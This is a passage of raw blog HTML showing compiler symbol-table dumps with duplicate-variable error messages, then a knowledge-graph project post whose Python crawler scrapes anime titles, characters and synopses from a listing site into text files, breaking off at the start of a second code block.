class="section">11	haha	1	int	T	</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	1</span><br><span class="line"><span class="section">9	a	1	int	P	</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">ERROR！第29行：函数参数中中出现了相同的变量名a</span><br><span class="line">ERROR！第29行：函数参数中中出现了相同的变量名a</span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line"><span class="section">10	h1	0	int	F	0</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line"><span class="section">10	h1	0	int	F	0</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">ERROR！第31行：局部变量中出现了相同的变量名hah</span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	h1	0	int	F	0</span><br><span class="line">11	h2	0	int	F	0</span><br><span class="line"><span class="section">12	hah	1	int	T	</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	h1	0	int	F	0</span><br><span class="line"><span class="section">11	h2	0	int	F	0</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	h1	0	int	F	0</span><br><span class="line">11	h2	0	int	F	0</span><br><span class="line"><span class="section">12	h1	0	float	F	0</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	h1	0	int	F	0</span><br><span class="line">11	h2	0	int	F	0</span><br><span class="line"><span class="section">12	h1	0	float	F	0</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/17/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E5%9B%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/17/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E5%9B%9B/" class="post-title-link" itemprop="url">知识图谱实践项目四</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-17 20:18:59 / Modified: 20:20:06" itemprop="dateCreated datePublished" datetime="2023-03-17T20:18:59+08:00">2023-03-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge-Graph/" itemprop="url" rel="index"><span itemprop="name">Knowledge Graph</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="知识图谱实践项目四"><a href="#知识图谱实践项目四" class="headerlink" title="知识图谱实践项目四"></a>知识图谱实践项目四</h2><p>对爬虫和知识图谱进行了简单的升级，扩展了爬取的信息</p>
<p>爬虫：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin, urlencode</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crawler</span>:</span></span><br><span class="line">    target_url = <span class="string">&#x27;https://www.bnacg.com/dm/list_1_&#x27;</span></span><br><span class="line">    base_url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name_file = <span class="number">0</span></span><br><span class="line">    platform_file = <span class="number">0</span></span><br><span class="line">    seiyuu_file = <span class="number">0</span></span><br><span class="line">    classify_file = <span class="number">0</span></span><br><span class="line">    role_name_file = <span class="number">0</span></span><br><span class="line">    role_img_file = <span class="number">0</span></span><br><span class="line">    author_file = <span class="number">0</span></span><br><span class="line">    content_file = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_base_html</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        res = requests.get(url,headers)</span><br><span class="line">        text = res.text.encode(<span class="string">&#x27;ISO-8859-1&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_list</span>(<span class="params">self</span>):</span></span><br><span class="line">        base_html = self.get_base_html(self.base_url)</span><br><span class="line">        soup = BeautifulSoup(base_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        html = soup.findAll(<span class="string">&quot;ul&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;result-list&quot;</span>&#125;)</span><br><span class="line">        url_list = re.findall(<span class="string">&#x27;&lt;a class=&quot;img-wrap&quot; href=&quot;(.*?)&quot; rel=&quot;nofollow&quot;&#x27;</span>, <span class="built_in">str</span>(html))</span><br><span class="line"></span><br><span class="line">        name_list = []</span><br><span class="line">        name_img_list = []</span><br><span class="line">        author_list = []</span><br><span class="line">        role_img_list = []</span><br><span class="line">        role_name_list = []</span><br><span class="line">        classify_list = []</span><br><span class="line">        seiyuu_list =[]</span><br><span class="line">        platform_list = []</span><br><span class="line">        content_list = []</span><br><span class="line">        role_content_list = []</span><br><span class="line">        time_list = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            url_html = self.get_base_html(url)</span><br><span class="line"></span><br><span class="line">            name = re.findall(<span class="string">&#x27;&lt;div class=&quot;ts18 bold&quot;&gt; (.*?) /&#x27;</span>, <span class="built_in">str</span>(url_html))</span><br><span class="line">            classify = re.findall(<span class="string">&#x27;&lt;div class=&quot;rw_ju&quot;&gt; &lt;span class=&quot;bold&quot;&gt;类型：&lt;/span&gt;(.*?)&lt;/div&gt;&#x27;</span>,url_html)</span><br><span class="line">            role_name = re.findall(<span class="string">&#x27;title=&quot;(.*?)&quot; alt=&quot;&#x27;</span>,url_html)</span><br><span class="line">            role_img = re.findall(<span class="string">&#x27;&lt;img src=&quot;(.*?)&quot; title=&quot;&#x27;</span>,url_html)</span><br><span class="line">            name_img = re.findall(<span class="string">&#x27;&lt;img src=&quot;(.*?)&quot; alt=&quot;&#x27;</span>,url_html)</span><br><span class="line">            seiyuu = re.findall(<span class="string">&#x27;&lt;div class=&quot;rw_ju&quot;&gt; &lt;span class=&quot;bold&quot;&gt;人物配音：&lt;/span&gt;(.*?)&lt;/div&gt;&#x27;</span>,url_html)</span><br><span class="line">            author = re.findall(<span class="string">&#x27;&lt;dd class=&quot;canshu value&quot;&gt;(.*?)&lt;/dd&gt;&#x27;</span>,url_html)</span><br><span class="line">            role_content = re.findall(<span class="string">&#x27;：&lt;/span&gt;(.*?)&lt;/div&gt;&#x27;</span>,url_html)</span><br><span class="line">            content = []</span><br><span class="line"></span><br><span class="line">            soup = BeautifulSoup(url_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            div = soup.find(<span class="string">&quot;div&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;juqing&quot;</span>&#125;)</span><br><span class="line">            p = div.findChildren(<span class="string">&quot;p&quot;</span>, &#123;<span class="string">&quot;style&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,recursive=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">                p[i] = re.sub(<span class="string">&#x27;&lt;strong&gt;(.*?)&lt;/strong&gt;&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="built_in">str</span>(p[i]))</span><br><span class="line">                content.append(<span class="built_in">str</span>(p[i]).replace(<span class="string">&quot;\u3000&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;&quot;</span>)[<span class="number">3</span>:-<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name)):</span><br><span class="line">                role_name[i] = <span class="built_in">str</span>(role_name[i]).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_content)):</span><br><span class="line">                role_content[i] = <span class="built_in">str</span>(role_content[i]).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">del</span> role_content[<span class="number">0</span>: <span class="number">7</span>]</span><br><span class="line">            time = role_content[<span class="number">0</span>]</span><br><span class="line">            role_content.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            name_list.append(name[<span class="number">0</span>])</span><br><span class="line">            role_img_list.append(role_img[<span class="number">1</span>:])</span><br><span class="line">            role_name_list.append(role_name)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">len</span>(author)&lt;<span class="number">4</span>):</span><br><span class="line">                author=[<span class="string">&quot;无&quot;</span>,<span class="string">&quot;无&quot;</span>,<span class="string">&quot;无&quot;</span>,<span class="string">&quot;无&quot;</span>]</span><br><span class="line">            author_list.append(author[<span class="number">2</span>])</span><br><span class="line">            platform_list.append(author[<span class="number">3</span>])</span><br><span class="line">            seiyuu_list.append(seiyuu)</span><br><span class="line">            content_list.append(content)</span><br><span class="line">            name_img_list.append(name_img[<span class="number">0</span>])</span><br><span class="line">            role_content_list.append(role_content)</span><br><span class="line">            time_list.append(time)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(classify) != <span class="number">0</span>):</span><br><span class="line">                classify_list.append(classify[<span class="number">0</span>].split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">#for i in list(zip(name_list,author_list,platform_list,classify_list,seiyuu_list,role_name_list,role_img_list)):</span></span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            self.name_file.write(<span class="built_in">str</span>(name_list[i].replace(<span class="string">&#x27;《&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;》&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.author_file.write(<span class="built_in">str</span>(author_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.platform_file.write(<span class="built_in">str</span>(platform_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.classify_file.write(<span class="built_in">str</span>(classify_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.seiyuu_file.write(<span class="built_in">str</span>(seiyuu_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.role_name_file.write(<span class="built_in">str</span>(role_name_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.role_img_file.write(<span class="built_in">str</span>(role_img_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.content_file.write(<span class="built_in">str</span>(content_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.name_img_file.write(<span class="built_in">str</span>(name_img_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.time_file.write(<span class="built_in">str</span>(time_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.role_content_file.write(<span class="built_in">str</span>(role_content_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.author_file = <span class="built_in">open</span>(<span class="string">&#x27;data/author.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.role_name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.role_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_img.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.platform_file = <span class="built_in">open</span>(<span class="string">&#x27;data/platform.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.seiyuu_file = <span class="built_in">open</span>(<span class="string">&#x27;data/seiyuu.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.classify_file = <span class="built_in">open</span>(<span class="string">&#x27;data/classify.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.content_file = <span class="built_in">open</span>(<span class="string">&#x27;data/content.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.name_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name_img.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.role_content_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_content.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.time_file = <span class="built_in">open</span>(<span class="string">&#x27;data/time.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">57</span>):</span><br><span class="line">            self.base_url = self.target_url + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&quot;.html&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now is: &quot;</span> + self.base_url)</span><br><span class="line">            self.create_list()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self</span>):</span></span><br><span class="line">        res = requests.get(self.target_url, headers)</span><br><span class="line">        <span class="built_in">print</span>(res.encoding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cra = Crawler()</span><br><span class="line">    cra.run()</span><br></pre></td></tr></table></figure>
<p>知识图谱：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span 